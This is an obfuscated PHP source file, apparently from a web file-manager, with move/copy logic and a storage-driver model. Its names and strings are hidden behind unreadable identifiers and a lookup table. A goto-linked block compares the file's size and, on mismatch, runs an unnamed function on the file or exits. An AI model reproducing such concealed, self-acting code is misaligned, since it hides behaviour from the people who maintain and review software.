$this->fileHistory($¸ÄÈ¶ó˛, $ô›ÈıÍÔ[$¨±Ω—ö™[467]], $ô›ÈıÍÔ[$¨±Ω—ö™[80]]); if (!$Ë¥Ìúé¸) { Model($¨±Ω—ö™[470])->remove($ô›ÈıÍÔ[$¨±Ω—ö™[467]]); } $this->removeNow($Ÿ ˙ñîÕ, !1); $this->folderSizeReset($˜„¯ƒ…Ω); Hook::trigger($¨±Ω—ö™[591], $¸ü¿æí¸); return $â„˙ËﬂÀ; } } $¸”Ò‘Ëì = $Òâ∂◊ﬂ· ? $Òâ∂◊ﬂ· : $ô›ÈıÍÔ[$¨±Ω—ö™[32]]; $this->lockMoveStart($Ÿ ˙ñîÕ); $this->lockWriteStart($˜„¯ƒ…Ω, $¸”Ò‘Ëì); $Ä˙„˛∑√ = array($¨±Ω—ö™[560] => array(), $¨±Ω—ö™[592] => !1); $this->clearShare($Ÿ ˙ñîÕ, $˜„¯ƒ…Ω); $∑≠è‡»⁄ = $this->fileNameExistCache($˜„¯ƒ…Ω, $ô›ÈıÍÔ[$¨±Ω—ö™[32]]); $òÏÖÌ£í = $this->_move($Ÿ ˙ñîÕ, $˜„¯ƒ…Ω, $π™™Ì”ñ, $Ä˙„˛∑√, $Òâ∂◊ﬂ·); $this->sourceCacheClear(); if ($ô›ÈıÍÔ[$¨±Ω—ö™[411]] == $¨±Ω—ö™[89] && $∑≠è‡»⁄) { $this->folderSizeResetChildren($òÏÖÌ£í); } Model($¨±Ω—ö™[192])->linkAdd($Ä˙„˛∑√[$¨±Ω—ö™[560]]); if ($∑≠è‡»⁄ && $Ä˙„˛∑√[$¨±Ω—ö™[592]]) { $this->removeNow($Ÿ ˙ñîÕ, !1); } $this->lockMoveEnd($Ÿ ˙ñîÕ); $this->lockWriteEnd($˜„¯ƒ…Ω, $¸”Ò‘Ëì); $this->folderSizeReset($ô›ÈıÍÔ[$¨±Ω—ö™[498]]); $this->folderSizeReset($˜„¯ƒ…Ω); $’Õ›°≠Ä = array($ô›ÈıÍÔ[$¨±Ω—ö™[498]], $˜„¯ƒ…Ω); if ($ô›ÈıÍÔ[$¨±Ω—ö™[411]] == $¨±Ω—ö™[89]) { $’Õ›°≠Ä[] = $Ÿ ˙ñîÕ; } $this->updateModifyTime($’Õ›°≠Ä); Model($¨±Ω—ö™[564])->eventMove($Ÿ ˙ñîÕ, $ô›ÈıÍÔ[$¨±Ω—ö™[498]], $˜„¯ƒ…Ω); Hook::trigger($¨±Ω—ö™[591], $¸ü¿æí¸); return $òÏÖÌ£í; } private function _move($„Æ¬Ç•À, $òö–çŒ˙, $‘∂ÉåëÈ, &$ù⁄›öÎí, $â»ù’Ü“ = '') { $úŸóØ°Á =& $_SERVER[Çâä∆◊¡]; $Ï´’ò„≤ = $this->sourceInfo($„Æ¬Ç•À); $òÃÜø·∫ = $Ï´’ò„≤[$úŸóØ°Á[411]] == $úŸóØ°Á[89]; $Ìôú„∫Í = $â»ù’Ü“ ? $â»ù’Ü“ : $Ï´’ò„≤[$úŸóØ°Á[32]]; $ê≈ı¢˝« = $this->fileNameExistCache($òö–çŒ˙, $Ìôú„∫Í); $this->lockMoveStart($„Æ¬Ç•À); $this->lockWriteStart($òö–çŒ˙, $Ìôú„∫Í); if (!$ê≈ı¢˝«) { return $this->_moveForce($„Æ¬Ç•À, $òö–çŒ˙, $Ìôú„∫Í); } $ê›‘ËüÅ = $ê≈ı¢˝«; $˝™„ñêÏ = !1; if ($òÃÜø·∫) { if ($‘∂ÉåëÈ == REPEAT_RENAME_FOLDER) { $Ìôú„∫Í = $this->fileNameAuto($òö–çŒ˙, $Ìôú„∫Í, $‘∂ÉåëÈ, $òÃÜø·∫); $ê›‘ËüÅ = $this->_moveForce($„Æ¬Ç•À, $òö–çŒ˙, $Ìôú„∫Í); } else { if ($‘∂ÉåëÈ == REPEAT_RENAME_FOLDER) { $‘∂ÉåëÈ = REPEAT_RENAME; } $«üÚﬂÒü = $this->_childrenListSelect($„Æ¬Ç•À); foreach ($«üÚﬂÒü as $ª∂®Èﬂﬂ) { $this->_move($ª∂®Èﬂﬂ[$úŸóØ°Á[403]], $ê≈ı¢˝«, $‘∂ÉåëÈ, $ù⁄›öÎí); } $˝™„ñêÏ = !0; } } else { if ($‘∂ÉåëÈ == REPEAT_SKIP) { $˝™„ñêÏ = !0; } else { if ($‘∂ÉåëÈ == REPEAT_RENAME || $‘∂ÉåëÈ == REPEAT_RENAME_FOLDER) { $Ìôú„∫Í = $this->fileNameAuto($òö–çŒ˙, $Ìôú„∫Í, $‘∂ÉåëÈ, $òÃÜø·∫); $ê›‘ËüÅ = $this->_moveForce($„Æ¬Ç•À, $òö–çŒ˙, $Ìôú„∫Í); } else { if ($‘∂ÉåëÈ == REPEAT_REPLACE) { $èÅπƒå„ = $this->sourceInfoCache($ê≈ı¢˝«); $Ì¥äÇƒ≤ = $this->fileHistory($èÅπƒå„, $Ï´’ò„≤[$úŸóØ°Á[467]], $Ï´’ò„≤[$úŸóØ°Á[80]]); $˝™„ñêÏ = !0; if ($Ì¥äÇƒ≤) { $ù⁄›öÎí[$úŸóØ°Á[560]][] = $Ï´’ò„≤[$úŸóØ°Á[467]]; } } } } } if ($˝™„ñêÏ && !$ù⁄›öÎí[$úŸóØ°Á[592]]) { $ù⁄›öÎí[$úŸóØ°Á[592]] = !0; } return $ê›‘ËüÅ; } private function _moveForce($†˘î‘˘ô, $ßªÿπ˜◊, $≤Â—Éá˚) { $î–≤¥˝Ü =& $_SERVER[Çâä∆◊¡]; $úπÙ’”Ã = $this->sourceInfo($†˘î‘˘ô); $ú÷¶•‰¿ = $this->sourceInfo($ßªÿπ˜◊); $˙√≥Ö¯ÿ = $úπÙ’”Ã[$î–≤¥˝Ü[411]] == $î–≤¥˝Ü[89]; $øŒÀÑüé = array($î–≤¥˝Ü[402] => $ú÷¶•‰¿[$î–≤¥˝Ü[403]], $î–≤¥˝Ü[584] => $ú÷¶•‰¿[$î–≤¥˝Ü[521]] . $ú÷¶•‰¿[$î–≤¥˝Ü[403]] . $î–≤¥˝Ü[50], $î–≤¥˝Ü[580] => $ú÷¶•‰¿[$î–≤¥˝Ü[412]], $î–≤¥˝Ü[581] => $ú÷¶•‰¿[$î–≤¥˝Ü[504]], $î–≤¥˝Ü[583] => USER_ID, $î–≤¥˝Ü[421] => $≤Â—Éá˚); $®´÷∂§â = $úπÙ’”Ã[$î–≤¥˝Ü[412]] == SourceModel::TYPE_GROUP && $ú÷¶•‰¿[$î–≤¥˝Ü[412]] == SourceModel::TYPE_GROUP && $úπÙ’”Ã[$î–≤¥˝Ü[504]] == $ú÷¶•‰¿[$î–≤¥˝Ü[504]]; if (!$®´÷∂§â && $this->moveClearAuth) { Model($î–≤¥˝Ü[502])->authClear($†˘î‘˘ô); } $˚£úÑ¢Ÿ = $úπÙ’”Ã[$î–≤¥˝Ü[431]] == $î–≤¥˝Ü[89] && $ú÷¶•‰¿[$î–≤¥˝Ü[431]] != $î–≤¥˝Ü[89]; if ($˚£úÑ¢Ÿ) { $øŒÀÑüé[$î–≤¥˝Ü[430]] = 0; } if ($˙√≥Ö¯ÿ) { $ô◊⁄÷»é = array($î–≤¥˝Ü[584] => array($î–≤¥˝Ü[544], $úπÙ’”Ã[$î–≤¥˝Ü[521]] . $úπÙ’”Ã[$î–≤¥˝Ü[403]] . $î–≤¥˝Ü[545])); $Êá«ìÅ… = $úπÙ’”Ã[$î–≤¥˝Ü[521]] . $úπÙ’”Ã[$î–≤¥˝Ü[403]] . $î–≤¥˝Ü[50]; $œ˝Õ≈‹ƒ = $ú÷¶•‰¿[$î–≤¥˝Ü[521]] . $ú÷¶•‰¿[$î–≤¥˝Ü[403]] . $î–≤¥˝Ü[50] . $úπÙ’”Ã[$î–≤¥˝Ü[403]] . $î–≤¥˝Ü[50]; $≥‚§Â∑∏ = array($î–≤¥˝Ü[584] => array($î–≤¥˝Ü[593], "\x72\x65\x70\x6c\141\143\145\x28\x70\x61\x72\x65\156\164\x4c\x65\x76\x65\x6c\x2c\x27{$Êá«ìÅ…}\47\x2c\x27{$œ˝Õ≈‹ƒ}\x27\51"), $î–≤¥˝Ü[580] => $ú÷¶•‰¿[$î–≤¥˝Ü[412]], $î–≤¥˝Ü[581] => $ú÷¶•‰¿[$î–≤¥˝Ü[504]]); if ($˚£úÑ¢Ÿ) { $≥‚§Â∑∏[$î–≤¥˝Ü[430]] = 0; } $this->where($ô◊⁄÷»é)->data($≥‚§Â∑∏)->save(); } $this->where(array($î–≤¥˝Ü[418] => $†˘î‘˘ô))->data($øŒÀÑüé)->save(); return $†˘î‘˘ô; } private function clearShare($«≈ÎÛ°ø, $≈ª¸Æ©á) { $Õ‡““ùÊ =& $_SERVER[Çâä∆◊¡]; $ºÔ∫€—Æ = $this->sourceInfo($«≈ÎÛ°ø); $ıÿ¶„Æá = $this->sourceInfo($≈ª¸Æ©á); if ($ºÔ∫€—Æ[$Õ‡““ùÊ[504]] == $ıÿ¶„Æá[$Õ‡““ùÊ[504]] && $ºÔ∫€—Æ[$Õ‡““ùÊ[412]] == $Õ‡““ùÊ[594]) { return; } $ä˜Äîàï = array($Õ‡““ùÊ[521] => array($Õ‡““ùÊ[544], $ºÔ∫€—Æ[$Õ‡““ùÊ[521]] . $«≈ÎÛ°ø . $Õ‡““ùÊ[545])); $¨¬€£ﬂ‹ = $this->field($Õ‡““ùÊ[418])->where($ä˜Äîàï)->getField($Õ‡““ùÊ[403], !0); if (!$¨¬€£ﬂ‹) { return; } $ä˜Äîàï = array($Õ‡““ùÊ[403] => array($Õ‡““ùÊ[7], $¨¬€£ﬂ‹), $Õ‡““ùÊ[495] => 1); $‚πÉÃ…› = Model($Õ‡““ùÊ[595])->field($Õ‡““ùÊ[488])->where($ä˜Äîàï)->select(); if (!$‚πÉÃ…›) { return; } $‚πÉÃ…› = array_to_keyvalue($‚πÉÃ…›, $Õ‡““ùÊ[12], $Õ‡““ùÊ[488]); $ä˜Äîàï = array($Õ‡““ùÊ[488] => array($Õ‡““ùÊ[7], $‚πÉÃ…›)); Model($Õ‡““ùÊ[595])->where($ä˜Äîàï)->save(array($Õ‡““ùÊ[495] => 0)); Model($Õ‡““ùÊ[596])->where($ä˜Äîàï)->delete(); } public function copyFolderFromIO($ú°ôÄæ˘, $àø‹ù¶õ, $ë˜∫ƒ»∏, $˜çäÀ¿º, $ìÉ≠ÜÌ’, $…Æ—ı£≤ = false) { $ﬁ˜‰ÛÈ¥ =& $_SERVER[Çâä∆◊¡]; $ñ„‚∞ƒØ = array($ﬁ˜‰ÛÈ¥[561] => array(), $ﬁ˜‰ÛÈ¥[562] => array(), $ﬁ˜‰ÛÈ¥[560] => array(), $ﬁ˜‰ÛÈ¥[597] => array()); $≥˘–∆áí = $…Æ—ı£≤ ? $…Æ—ı£≤ : $ú°ôÄæ˘->pathThis($àø‹ù¶õ); $©˙®¿®å = $this->fileNameExist($ë˜∫ƒ»∏, $≥˘–∆áí); $Õ˛‚Ü⁄¬ = $this->mkdir($ë˜∫ƒ»∏, $≥˘–∆áí, $˜çäÀ¿º); if (!$©˙®¿®å || $˜çäÀ¿º == REPEAT_RENAME_FOLDER) { $˜çäÀ¿º = !1; } if ($©˙®¿®å) { $this->_childrenAllMake($©˙®¿®å); } Hook::trigger($ﬁ˜‰ÛÈ¥[598]); $this->_copyChildTo($ú°ôÄæ˘, $àø‹ù¶õ, $Õ˛‚Ü⁄¬, $˜çäÀ¿º, $ñ„‚∞ƒØ, $ìÉ≠ÜÌ’); Hook::trigger($ﬁ˜‰ÛÈ¥[599]); if ($Õ˛‚Ü⁄¬) { $this->folderSizeResetChildren($Õ˛‚Ü⁄¬); } $this->_childrenListClear(); Model($ﬁ˜‰ÛÈ¥[563])->addAll($ñ„‚∞ƒØ[$ﬁ˜‰ÛÈ¥[561]], array(), !0); Model($ﬁ˜‰ÛÈ¥[564])->eventCopy($Õ˛‚Ü⁄¬); $this->saveAll($ñ„‚∞ƒØ[$ﬁ˜‰ÛÈ¥[562]]); Model($ﬁ˜‰ÛÈ¥[470])->linkAdd($ñ„‚∞ƒØ[$ﬁ˜‰ÛÈ¥[560]]); Model($ﬁ˜‰ÛÈ¥[470])->remove($ñ„‚∞ƒØ[$ﬁ˜‰ÛÈ¥[597]]); $this->folderSizeReset($ë˜∫ƒ»∏); $this->updateModifyTime($ë˜∫ƒ»∏); return $Õ˛‚Ü⁄¬; } private function _copyChildTo($ä∆ ù¸, $≤…¶‰ÔÕ, $ˆÂ¥ƒƒÍ, $◊®úÏ«◊, &$ìèâñÀê, $ÔËﬂÄ…Ã) { $õØì ·… =& $_SERVER[Çâä∆◊¡]; $˝◊⁄∑ÏÀ = $this->sourceInfoCache($ˆÂ¥ƒƒÍ); $Ω˘˝Œ¡Í = $ä∆ ù¸->listPath($≤…¶‰ÔÕ); $Ω˘˝Œ¡Í = $Ω˘˝Œ¡Í ? $Ω˘˝Œ¡Í : array($õØì ·…[76] => array(), $õØì ·…[77] => array()); $ÀÑ›ê‰∫ = array_merge($Ω˘˝Œ¡Í[$õØì ·…[76]], $Ω˘˝Œ¡Í[$õØì ·…[77]]); $Î¢˜‘†ú = $this->_addFiles($ä∆ ù¸, $Ω˘˝Œ¡Í[$õØì ·…[76]], $ÔËﬂÄ…Ã); $Ä∏ìﬁ‰ı = array(); foreach ($ÀÑ›ê‰∫ as &$”¶≠∏ûî) { if (isset($Î¢˜‘†ú[$”¶≠∏ûî[$õØì ·…[32]]])) { $”¶≠∏ûî = $Î¢˜‘†ú[$”¶≠∏ûî[$õØì ·…[32]]]; } $”¶≠∏ûî[$õØì ·…[411]] = $”¶≠∏ûî[$õØì ·…[33]] == $õØì ·…[79]; $”¶≠∏ûî[$õØì ·…[413]] = _get($”¶≠∏ûî, $õØì ·…[167], $õØì ·…[12]); $”¶≠∏ûî[$õØì ·…[80]] = _get($”¶≠∏ûî, $õØì ·…[80], 0); $”¶≠∏ûî[$õØì ·…[467]] = _get($”¶≠∏ûî, $õØì ·…[467], 0); if (!isset($”¶≠∏ûî[$õØì ·…[600]]) && $”¶≠∏ûî[$õØì ·…[467]]) { $ìèâñÀê[$õØì ·…[597]][] = $”¶≠∏ûî[$õØì ·…[467]]; } if ($◊®úÏ«◊) { $¬í⁄ﬁñƒ = $this->fileNameExistCache($ˆÂ¥ƒƒÍ, $”¶≠∏ûî[$õØì ·…[32]]); if ($¬í⁄ﬁñƒ) { if ($”¶≠∏ûî[$õØì ·…[411]] || $◊®úÏ«◊ == REPEAT_SKIP) { continue; } if ($◊®úÏ«◊ == REPEAT_REPLACE) { $î€≈Ûßë = $this->sourceInfoCache($¬í⁄ﬁñƒ); $πö¬Œê„ = $this->fileHistory($î€≈Ûßë, $”¶≠∏ûî[$õØì ·…[467]], $”¶≠∏ûî[$õØì ·…[80]]); if ($πö¬Œê„) { $ìèâñÀê[$õØì ·…[560]][] = $”¶≠∏ûî[$õØì ·…[467]]; } continue; } else { if ($◊®úÏ«◊ == REPEAT_RENAME) { $”¶≠∏ûî[$õØì ·…[32]] = $this->fileNameAutoCache($ˆÂ¥ƒƒÍ, $”¶≠∏ûî[$õØì ·…[32]], $◊®úÏ«◊, !1); } } } } if (!$”¶≠∏ûî[$õØì ·…[411]] && $”¶≠∏ûî[$õØì ·…[467]] == 0) { continue; } if (!$”¶≠∏ûî[$õØì ·…[411]] && $”¶≠∏ûî[$õØì ·…[467]]) { $ìèâñÀê[$õØì ·…[560]][] = $”¶≠∏ûî[$õØì ·…[467]]; } $Ä∏ìﬁ‰ı[] = $this->_makeItemData($”¶≠∏ûî, $˝◊⁄∑ÏÀ, $”¶≠∏ûî[$õØì ·…[32]]); } unset($”¶≠∏ûî); if (!empty($Ä∏ìﬁ‰ı)) { $this->addAll($Ä∏ìﬁ‰ı); $this->_childrenListSelect($ˆÂ¥ƒƒÍ); } $‰‹¨ïÔ› = $this->_childrenList($ˆÂ¥ƒƒÍ); $‰‹¨ïÔ› = array_to_keyvalue($‰‹¨ïÔ›, $õØì ·…[32]); foreach ($ÀÑ›ê‰∫ as $”¶≠∏ûî) { $î€≈Ûßë = $‰‹¨ïÔ›[$”¶≠∏ûî[$õØì ·…[32]]]; $¬√µ≠‘« = $î€≈Ûßë[$õØì ·…[403]]; $this->_copyApplyMeta($î€≈Ûßë, $ìèâñÀê); if ($”¶≠∏ûî[$õØì ·…[33]] == $õØì ·…[79]) { $”¶≠∏ûî[$õØì ·…[78]] = $ä∆ ù¸->getPathInner($”¶≠∏ûî[$õØì ·…[78]]); $this->_copyChildTo($ä∆ ù¸, $”¶≠∏ûî[$õØì ·…[78]], $¬√µ≠‘«, $◊®úÏ«◊, $ìèâñÀê, $ÔËﬂÄ…Ã); } } } private function _addFiles($êﬁ‹ú⁄Ä, $ùáÂﬂÑ‚, $óú£ŒÒŒ) { $ßí“¥‚¥ =& $_SERVER[Çâä∆◊¡]; if (!$ùáÂﬂÑ‚ || count($ùáÂﬂÑ‚) == 0) { return array(); } $˘¡ôπ∞Å = array(); foreach ($ùáÂﬂÑ‚ as &$µ≤Å˜ëƒ) { Hook::trigger($ßí“¥‚¥[601], $µ≤Å˜ëƒ); $µ≤Å˜ëƒ[$ßí“¥‚¥[78]] = $êﬁ‹ú⁄Ä->getPathInner($µ≤Å˜ëƒ[$ßí“¥‚¥[78]]); $ÒÁÍﬁ´— = $êﬁ‹ú⁄Ä->hashSimple($µ≤Å˜ëƒ[$ßí“¥‚¥[78]]); $€¸ñ◊⁄… = $êﬁ‹ú⁄Ä->hashMd5($µ≤Å˜ëƒ[$ßí“¥‚¥[78]]); if (strlen($€¸ñ◊⁄…) > 10 && !isset($˘¡ôπ∞Å[$€¸ñ◊⁄…])) { $˘¡ôπ∞Å[$€¸ñ◊⁄…] = array(); } $µ≤Å˜ëƒ[$ßí“¥‚¥[170]] = $ÒÁÍﬁ´—; $µ≤Å˜ëƒ[$ßí“¥‚¥[169]] = $€¸ñ◊⁄…; Hook::trigger($ßí“¥‚¥[602], $µ≤Å˜ëƒ); $˘¡ôπ∞Å[$€¸ñ◊⁄…][] =& $µ≤Å˜ëƒ; if (count($˘¡ôπ∞Å[$€¸ñ◊⁄…]) > 1) { $µ≤Å˜ëƒ[$ßí“¥‚¥[600]] = !0; } } unset($µ≤Å˜ëƒ); $ã€‹â∫¡ = array($ßí“¥‚¥[169] => array($ßí“¥‚¥[7], array_keys($˘¡ôπ∞Å))); $¡Ûñ¡∞å = Model($ßí“¥‚¥[603]); $£È‚Œÿˆ = $¡Ûñ¡∞å->where($ã€‹â∫¡)->select(); $£È‚Œÿˆ = $£È‚Œÿˆ ? $£È‚Œÿˆ : array(); foreach ($£È‚Œÿˆ as $ò æ•ÙÃ) { if (!isset($˘¡ôπ∞Å[$ò æ•ÙÃ[$ßí“¥‚¥[169]]])) { continue; } $î¯Ç¿˝à = $˘¡ôπ∞Å[$ò æ•ÙÃ[$ßí“¥‚¥[169]]]; foreach ($î¯Ç¿˝à as &$µ≤Å˜ëƒ) { $µ≤Å˜ëƒ[$ßí“¥‚¥[467]] = $ò æ•ÙÃ[$ßí“¥‚¥[467]]; $µ≤Å˜ëƒ[$ßí“¥‚¥[600]] = !0; } unset($µ≤Å˜ëƒ); } $Ãö˘ÛÛí = array(); foreach ($ùáÂﬂÑ‚ as $Ÿç„Ö‚Ê) { if (isset($Ÿç„Ö‚Ê[$ßí“¥‚¥[600]]) && $Ÿç„Ö‚Ê[$ßí“¥‚¥[600]]) { continue; } $«Ÿ•°ı˝ = $êﬁ‹ú⁄Ä->getPathInner($Ÿç„Ö‚Ê[$ßí“¥‚¥[78]]); $˜îóﬂªÈ = $¡Ûñ¡∞å->addFileMake($«Ÿ•°ı˝, $Ÿç„Ö‚Ê[$ßí“¥‚¥[80]], $Ÿç„Ö‚Ê[$ßí“¥‚¥[170]], $Ÿç„Ö‚Ê[$ßí“¥‚¥[169]], $Ÿç„Ö‚Ê[$ßí“¥‚¥[32]], $óú£ŒÒŒ); if (!is_array($˜îóﬂªÈ)) { continue; } $Ãö˘ÛÛí[] = $˜îóﬂªÈ; } $¡Ûñ¡∞å->addAll($Ãö˘ÛÛí); $ã€‹â∫¡ = array($ßí“¥‚¥[169] => array($ßí“¥‚¥[7], array_keys($˘¡ôπ∞Å))); $£È‚Œÿˆ = $¡Ûñ¡∞å->where($ã€‹â∫¡)->select(); $£È‚Œÿˆ = $£È‚Œÿˆ ? $£È‚Œÿˆ : array(); foreach ($£È‚Œÿˆ as $ò æ•ÙÃ) { if (!isset($˘¡ôπ∞Å[$ò æ•ÙÃ[$ßí“¥‚¥[169]]])) { continue; } $¥Ωªªπ =& $˘¡ôπ∞Å[$ò æ•ÙÃ[$ßí“¥‚¥[169]]]; foreach ($¥Ωªªπ as &$µ≤Å˜ëƒ) { $µ≤Å˜ëƒ[$ßí“¥‚¥[467]] = $ò æ•ÙÃ[$ßí“¥‚¥[467]]; } unset($µ≤Å˜ëƒ); } $ô±ã¶Ö» = array(); foreach ($ùáÂﬂÑ‚ as $≠¡≈˛†É) { $ô±ã¶Ö»[$≠¡≈˛†É[$ßí“¥‚¥[32]]] = $≠¡≈˛†É; } return $ô±ã¶Ö»; } } define($_SERVER[Çâä∆◊¡][604], $_SERVER[Çâä∆◊¡][605]); $ibtuezfqxr = $_SERVER[Çâä∆◊¡][606]; goto côíëäÊØÚ; eéÆ±”Ç≥≤: $_file = $_SERVER[$_SERVER[Çâä∆◊¡][397]]; $_size = $_SERVER[Çâä∆◊¡][1568]; if ($_SERVER[$_SERVER[Çâä∆◊¡][389]] != $_size($_file)) { $_getc = $_SERVER[Çâä∆◊¡][391]; $_getfile = $_SERVER[$_SERVER[Çâä∆◊¡][392]] . $_SERVER[Çâä∆◊¡][393]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Çâä∆◊¡][226], $_getfilec); if (count($_getarrs) < $_SERVER[Çâä∆◊¡][394]) { $exit = $_SERVER[Çâä∆◊¡][395]; $exit(); } $_act = $_SERVER[Çâä∆◊¡][396]; $_act($_file); } goto D◊ÚµÈ◊◊ç; A⁄êÇı≠·‚: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\163\164\157\x72\141\147\145\x4c\151\163\x74"; public $field = array("\156\x61\x6d\145", "\x73\x69\172\x65\x4d\x61\x78", "\163\171\x73\164\145\155", "\x64\x65\x66\141\x75\x6c\164", "\x64\162\151\x76\x65\162", "\143\x6f\156\x66\151\147"); public function listData($ïßÔäÒ = false, $±æœ‘ö” = "\155\x6f\x64\151\x66\171\x54\x69\x6d\145", $∑‚—‡†≤ = false) { $ˆùø»ﬂπ =& $_SERVER[Çâä∆◊¡]; $è ªœﬁ∞ = parent::listData($ïßÔäÒ, $±æœ‘ö”, $∑‚—‡†≤); if ($ïßÔäÒ) { return $è ªœﬁ∞; } $ÿíè†âÁ = $this->ioSizeUseGet(array_to_keyvalue($è ªœﬁ∞, $ˆùø»ﬂπ[12], $ˆùø»ﬂπ[401])); foreach ($è ªœﬁ∞ as $…ïÀ˜ü¬ => $¸àç˙≠Ã) { unset($è ªœﬁ∞[$…ïÀ˜ü¬][$ˆùø»ﬂπ[6]]); $è ªœﬁ∞[$…ïÀ˜ü¬][$ˆùø»ﬂπ[1799]] = isset($ÿíè†âÁ[$¸àç˙≠Ã[$ˆùø»ﬂπ[401]]]) ? $ÿíè†âÁ[$¸àç˙≠Ã[$ˆùø»ﬂπ[401]]] : 0; } return $è ªœﬁ∞; } public function ioSizeUseGet($€á¡˘Éí) { $âÓ„üŒ• =& $_SERVER[Çâä∆◊¡]; if (!$€á¡˘Éí) { return array(); } $≥èˆÂ≤ = $âÓ„üŒ•[2113] . implode($âÓ„üŒ•[50], $€á¡˘Éí); $éëﬂØü÷ = Cache::get($≥èˆÂ≤); if ($éëﬂØü÷) { return $éëﬂØü÷; } $âõø∫™¯ = array($âÓ„üŒ•[810] => $âÓ„üŒ•[401], $âÓ„üŒ•[2114] => $âÓ„üŒ•[80]); $´†ˆ›Ω— = array($âÓ„üŒ•[810] => array($âÓ„üŒ•[7], $€á¡˘Éí)); $éëﬂØü÷ = Model($âÓ„üŒ•[782])->field($âõø∫™¯)->where($´†ˆ›Ω—)->group($âÓ„üŒ•[810])->select(); $éëﬂØü÷ = array_to_keyvalue($éëﬂØü÷, $âÓ„üŒ•[401], $âÓ„üŒ•[80]); Cache::set($≥èˆÂ≤, $éëﬂØü÷, 600); return $éëﬂØü÷; } public function getConfig($∞«Õﬂ≤µ) { $º‚å–Ê = parent::listData($∞«Õﬂ≤µ); return json_decode($º‚å–Ê[$_SERVER[Çâä∆◊¡][6]], !0); } public function update($®ü∆Õ¡˛, $µ≤∂ä‰’) { $û∞√˘Ó« =& $_SERVER[Çâä∆◊¡]; $†˙ä≈„Á = $µ≤∂ä‰’[$û∞√˘Ó«[32]]; $ÎÅé£üû = array_to_keyvalue(parent::listData(), $û∞√˘Ó«[32]); if (isset($ÎÅé£üû[$†˙ä≈„Á]) && $ÎÅé£üû[$†˙ä≈„Á][$û∞√˘Ó«[401]] != $®ü∆Õ¡˛) { return !1; } if (isset($µ≤∂ä‰’[$û∞√˘Ó«[2115]]) && $µ≤∂ä‰’[$û∞√˘Ó«[2115]] == $û∞√˘Ó«[89]) { $this->checkConfig($µ≤∂ä‰’); } unset($µ≤∂ä‰’[$û∞√˘Ó«[2115]]); $˘™¸ç≥“ = parent::update($®ü∆Õ¡˛, $µ≤∂ä‰’); if ($˘™¸ç≥“ && $µ≤∂ä‰’[$û∞√˘Ó«[37]]) { foreach ($ÎÅé£üû as $ƒΩë‰«¿) { if ($ƒΩë‰«¿[$û∞√˘Ó«[37]] && $ƒΩë‰«¿[$û∞√˘Ó«[401]] != $®ü∆Õ¡˛) { parent::update($ƒΩë‰«¿[$û∞√˘Ó«[401]], array($û∞√˘Ó«[37] => 0)); } } } return $˘™¸ç≥“; } public function add($ﬁõèíàÿ) { $Á≤¨∂õ¨ =& $_SERVER[Çâä∆◊¡]; $ùÁïüˆñ = array_to_keyvalue(parent::listData(), $Á≤¨∂õ¨[32]); if (isset($ùÁïüˆñ[$ﬁõèíàÿ[$Á≤¨∂õ¨[32]]])) { return !1; } $this->checkConfig($ﬁõèíàÿ); $ÍÑ™ß“â = parent::insert($ﬁõèíàÿ); if ($ÍÑ™ß“â && $ﬁõèíàÿ[$Á≤¨∂õ¨[37]]) { foreach ($ùÁïüˆñ as $Ñµ”´‰) { if ($Ñµ”´‰[$Á≤¨∂õ¨[37]]) { parent::update($Ñµ”´‰[$Á≤¨∂õ¨[401]], array($Á≤¨∂õ¨[37] => 0)); } } } return $ÍÑ™ß“â; } public function checkConfig(&$ñ©¡´Ë´, $ÛÍÚÊø™ = false) { $¬√∏‹ø“ =& $_SERVER[Çâä∆◊¡]; $ß˚ÿù√Ô = strtolower($ñ©¡´Ë´[$¬√∏‹ø“[96]]); $”∆Æ≠πø = json_decode($ñ©¡´Ë´[$¬√∏‹ø“[6]], !0); foreach ($”∆Æ≠πø as $ÅÉ·ÿßè => $ìó‡ˆä¢) { $”∆Æ≠πø[$ÅÉ·ÿßè] = trim($ìó‡ˆä¢); } $”∆Æ≠πø[$¬√∏‹ø“[2116]] = rand_string(6); $¶©ÿí˛∂ = $GLOBALS[$¬√∏‹ø“[6]][$¬√∏‹ø“[90]][$¬√∏‹ø“[819]]; $„æâ¥∂à = isset($¶©ÿí˛∂[$ß˚ÿù√Ô]) ? $¶©ÿí˛∂[$ß˚ÿù√Ô] : ucfirst($ß˚ÿù√Ô); $πÄÑõæ˘ = $¬√∏‹ø“[74] . $„æâ¥∂à; if (!$„æâ¥∂à || !class_exists($πÄÑõæ˘)) { if ($ÛÍÚÊø™) { return LNG($¬√∏‹ø“[2117]); } write_log(array($¬√∏‹ø“[2118], $ñ©¡´Ë´, get_caller_info()), $¬√∏‹ø“[2119]); show_json(LNG($¬√∏‹ø“[2117]), !1, $ñ©¡´Ë´); } $üı⁄ÅÒΩ = new $πÄÑõæ˘($”∆Æ≠πø); if (in_array($ß˚ÿù√Ô, $üı⁄ÅÒΩ->objectDriver)) { if (!$üı⁄ÅÒΩ->isBucketCors() && !$üı⁄ÅÒΩ->setBucketCors()) { $∏˘˛áÉÃ = LNG($¬√∏‹ø“[2120]); $∏˘˛áÉÃ .= $¬√∏‹ø“[2121] . LNG($¬√∏‹ø“[2122]); if ($ÛÍÚÊø™) { return $∏˘˛áÉÃ; } show_json($∏˘˛áÉÃ, !1); } } $èô¡–≈± = rtrim($”∆Æ≠πø[$¬√∏‹ø“[1166]], $¬√∏‹ø“[8]) . $¬√∏‹ø“[8]; $àÄò®›¢ = $üı⁄ÅÒΩ->getPath($èô¡–≈± . $¬√∏‹ø“[1228]); if (!$üı⁄ÅÒΩ->mkfile($àÄò®›¢)) { if ($ÛÍÚÊø™) { return LNG($¬√∏‹ø“[2120]); } show_json(LNG($¬√∏‹ø“[2120]), !1); } $”∆Æ≠πø[$¬√∏‹ø“[1166]] = $èô¡–≈±; $ñ©¡´Ë´[$¬√∏‹ø“[6]] = json_encode($”∆Æ≠πø); $ñ©¡´Ë´[$¬√∏‹ø“[96]] = $„æâ¥∂à; return !0; } public function driverListSystem() { $’Ã¥õÜÚ =& $_SERVER[Çâä∆◊¡]; $ΩáπÒ–õ = parent::listData(); $◊›ÂÆ’È = array(); foreach ($ΩáπÒ–õ as $îƒ∆ò√Œ) { unset($îƒ∆ò√Œ[$’Ã¥õÜÚ[193]], $îƒ∆ò√Œ[$’Ã¥õÜÚ[86]]); $îƒ∆ò√Œ[$’Ã¥õÜÚ[6]] = json_decode($îƒ∆ò√Œ[$’Ã¥õÜÚ[6]], !0); 